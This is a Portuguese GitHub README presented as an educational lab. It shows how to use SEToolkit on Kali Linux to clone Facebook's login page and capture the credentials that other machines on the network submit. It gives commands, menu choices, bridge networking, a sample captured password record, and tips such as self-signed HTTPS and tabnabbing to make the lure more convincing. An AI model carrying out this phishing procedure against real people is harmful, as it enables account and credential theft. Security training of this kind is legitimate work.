# phishing-educacional
Demonstração de Phishing Educacional com SEToolkit no Kali Linux
Visão Geral
Este projeto demonstra fins educacionais como ferramentas de engenharia social podem ser utilizadas para testes de segurança, especificamente criando uma página clonada do Facebook para análise de ataques de phishing em ambiente controlado.

Aviso Legal
- Este projeto é apenas para fins educacionais e testes autorizados.
- Nunca use em redes ou sistemas sem permissão explícita.
- O phishing é ilegal quando aplicado maliciosamente.

 Configuração do Ambiente
Pré-requisitos:
- Kali Linux (VM no VirtualBox)

- VirtualBox instalado

Acesso root/sudo : 
 
  Passo 1: Configuração de Rede
- Para permitir que outras máquinas acessem a página clonada:

- Altere o modo de rede no VirtualBox:

- Desligue a VM

- Vá em Configurações > Rede

- Mude de NAT para Bridge
- Inicie a VM novamente

Verifique o novo IP:
ip a
Anote o IP em eth0 ou enp0s3 (ex: 192.168.1.105)

 Execução do SEToolkit
Passo 2: Instalação e Inicialização
bash
sudo apt update && sudo apt install -y set
sudo setoolkit
Passo 3: Configuração do Ataque
No menu interativo:

text
1) Social-Engineering Attacks  
2) Website Attack Vectors  
3) Credential Harvester Attack Method  
2) Site Cloner  

URL para clonar: https://www.facebook.com

IP para POST back: [IP da sua VM em modo Bridge]

Testando o Ataque
Em outra máquina na mesma rede, acesse:

text
http://[IP-DA-VM]
A página clonada do Facebook será exibida.

Credenciais inseridas serão capturadas no terminal do SEToolkit.

 Resultados Obtidos:
- Durante os testes, o SEToolkit identificou:
- Campos de formulário (usuário/senha)
- Parâmetros de sessão e cookies
- Dados de armazenamento local

  Exemplo de saída:
-POST DATA CAPTURED:
-USERNAME FIELD: email
-PASSWORD FIELD: pass

Como Melhorar

- Use HTTPS com certificado autoassinado (openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout key.pem -out cert.pem)
- Combine com Tabnabbing (opção 4 no SET)
- Registre logs detalhados para análise




![Dio-kali_teste](https://github.com/user-attachments/assets/f6546106-046f-4b6a-99a9-b6ac114e0b0d)

Configuração Técnica Detalhada

Arquitetura do Sistema : 

[VM Kali Linux (SEToolkit)]
       ↑
[VirtualBox Bridge Mode]
       ↑
[Rede Laboratório Isolada]
       ↑
[Dispositivo Teste (Vítima Simulada)]

- VirtualBox: Versão 6.1 ou superior

- Kali Linux: 2023.4 ou mais recente

- Alocação de Recursos:

- 2 CPUs virtuais

- 4GB de RAM

- 25GB de armazenamento

  Configuração de Rede Avançada
Modo Bridge vs NAT
Configuração	Vantagens	Desvantagens
NAT	Seguro, isolado	Acesso apenas local
Bridge	Acesso na rede local	Requer firewall

  Passo-a-passo para Bridge:
Desligue a VM
Abra Configurações > Rede
Selecione "Placa em modo Bridge"
Escolha o adaptador físico correto

Configure filtros MAC se necessário
  Fluxo de Trabalho do SEToolkit
Diagrama do Processo
<img width="2661" height="1293" alt="deepseek_mermaid_20250725_54b31d" src="https://github.com/user-attachments/assets/ad900f8d-2ded-4a93-b594-89dd7841fb5c" />


 Análise de Resultados
Estrutura de Dados Capturados
json
{
  "timestamp": "2025-07-25T14:30:00Z",
  "ip_victim": "192.168.1.105",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0)",
  "form_data": {
    "email": "teste@example.com",
    "pass": "s3nh4T3ste"
  },
  "metadata": {
    "cookies": 3,
    "headers": 12
  }
}
Tabela de Métricas
Métrica	Valor Esperado	Significado
Tempo de Clonagem	< 2 minutos	Eficiência do SET
Campos Detectados	≥ 2	Sucesso na análise
Tráfego HTTP	200-500KB	Página leve

 Boas Praticas de Segurança
Precauções Obrigatórias
Isolamento de Rede:

Configure regras no firewall:

bash
sudo ufw allow from 192.168.1.0/24
sudo ufw enable
Criptografia:

Gere certificado SSL:

bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
Gestão de Logs:

Automatize a limpeza:

bash
sudo logrotate -f /etc/logrotate.d/apache2

 Recursos Adicionais
Ferramentas Complementares
Bettercap - Para análise de rede

Wireshark - Captura de pacotes

Burp Suite - Teste de aplicações web

Leitura Recomendada
"The Web Application Hacker's Handbook"

OWASP Top 10

RFC 9110 (HTTP Semantics)

 Como Contribuir
Faça um fork do repositório

Crie sua branch (git checkout -b feature/nova-funcionalidade)

Commit suas mudanças (git commit -am 'Adiciona X recurso')

Push para a branch (git push origin feature/nova-funcionalidade)

Abra um Pull Request

Licença
Este projeto está licenciado sob a Creative Commons Attribution-NonCommercial 4.0 International License - veja o arquivo LICENSE.md para detalhes.

Nota Final: Este material foi desenvolvido exclusivamente para propósitos educacionais em segurança da informação. O uso indevido desta informação é estritamente proibido e pode violar leis locais e internacionais.
